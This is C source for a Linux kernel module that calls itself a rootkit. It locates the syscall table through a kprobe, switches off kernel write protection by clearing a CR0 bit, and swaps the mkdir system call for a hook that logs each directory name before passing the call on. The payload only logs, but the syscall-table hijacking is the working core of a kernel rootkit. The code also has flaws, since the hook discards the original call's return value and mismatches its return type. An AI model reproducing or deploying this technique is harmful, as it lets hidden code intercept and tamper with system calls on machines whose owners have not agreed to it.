#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/unistd.h>
#include <linux/kallsyms.h>
#include <linux/syscalls.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/uaccess.h>
#include <linux/namei.h>   

MODULE_DESCRIPTION("mkdir hook");
MODULE_LICENSE("GPL");
MODULE_AUTHOR("m4rcos");

// static void **syscall_table;
static unsigned long * syscall_table;
static inline void write_cr0_forced(unsigned long val) {
    asm volatile("mov %0, %%cr0" : : "r"(val));
}

static inline void protect_memory(void) {
    write_cr0_forced(read_cr0() | 0x10000);
}

static inline void unprotect_memory(void) {
    write_cr0_forced(read_cr0() & ~0x10000);
}

static struct kprobe kp = {
    .symbol_name = "sys_call_table"
};


typedef asmlinkage long (*orig_mkdir_t)(const struct pt_regs *);
orig_mkdir_t orig_mkdir;


// static asmlinkage long hook_mkdir(const struct pt_regs *regs) {
//     char __user *pathname = (char *)regs->di; 
//     char dirname[NAME_MAX] = {0};
//     long err;

//     err = strncpy_from_user(dirname, pathname, NAME_MAX - 1);

//     printk(KERN_INFO "Creating directory: %s\n", dirname);
//     orig_mkdir(regs);
//     return 0;  
// }
asmlinkage int hook_mkdir(const struct pt_regs *regs)
{
    printk("kalled");
    char __user *pathname = (char *)regs->di;
    char dir_name[NAME_MAX] = {0};

    /* Copy the directory name from userspace (pathname, from
     * the pt_regs struct, to kernelspace (dir_name) so that we
     * can print it out to the kernel buffer */
    long error = strncpy_from_user(dir_name, pathname, NAME_MAX);

    if (error > 0)
        printk(KERN_INFO "rootkit: Trying to create directory with name: %s\n", dir_name);

    /* Pass the pt_regs struct along to the original sys_mkdir syscall */
    orig_mkdir(regs);
    return 0;
}



static void read_syscall_table(void) {
    register_kprobe(&kp);
    syscall_table = (unsigned long *)kp.addr;
    unregister_kprobe(&kp); 
    // return addr;
}

static int __init kit_init(void) {
    
    read_syscall_table();
    printk("syscall @ 0x%lx\n",syscall_table);
    if (!syscall_table) {
        printk(KERN_ERR "Failed to read syscall table\n");
        return -1;
    }

    orig_mkdir = (orig_mkdir_t)(syscall_table[__NR_mkdir]);
    printk(KERN_INFO"this is the mkdir @ 0x%lx\n",orig_mkdir);

    unprotect_memory();
    syscall_table[__NR_mkdir] = (unsigned long)hook_mkdir;
    wmb(); 
    protect_memory();

    printk(KERN_INFO "mkdir hooked \n syscall_table:@ 0x%lx\n mkdir @ 0x%lx\n",syscall_table,syscall_table[__NR_mkdir]);
    return 0;
}

static void __exit clean_up(void) {
    printk(KERN_INFO "Cleaning up\n");
    unprotect_memory();
    syscall_table[__NR_mkdir] = orig_mkdir; 
    protect_memory();
    // unregister_kprobe(&kp); 
}

module_init(kit_init);
module_exit(clean_up);